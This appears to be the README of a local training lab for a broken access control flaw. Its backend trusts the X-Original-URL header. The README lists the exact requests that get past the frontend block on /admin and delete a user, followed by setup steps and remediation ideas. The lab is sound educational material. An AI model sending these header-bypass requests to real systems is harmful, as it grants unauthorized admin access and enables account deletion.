# Broken Access Control Lab (X-Original-URL Bypass)

##  Description
This lab demonstrates a backend access control bypass where the application trusts the `X-Original-URL` header.

A frontend layer blocks access to `/admin`, but the backend still processes it, allowing attackers to bypass restrictions.

##  Vulnerability
- Broken Access Control
- Vertical Privilege Escalation

##  How it works

1. Direct access:
   GET /admin → 403

2. Bypass:
GET /
X-Original-URL: /admin

3. Delete user:
GET /?username=carlos
X-Original-URL: /admin/delete


## Run the lab
- pip install -r requirements.txt
- python3 app.py or python app.py (python3 called in ubuntu server)

 Access
- http://localhost:5000

 Reset lab
- POST /reset

 Fix (concept)
- Do not trust client headers
- Enforce authorization on backend
- Implement role-based access control

 Learning Outcome
- Frontend vs backend security difference
- Header-based bypass techniques
- Real-world access control flaws

---

# Initialize Git

```  
git init
git add .
git commit -m "Initial commit - Broken Access Control Lab"
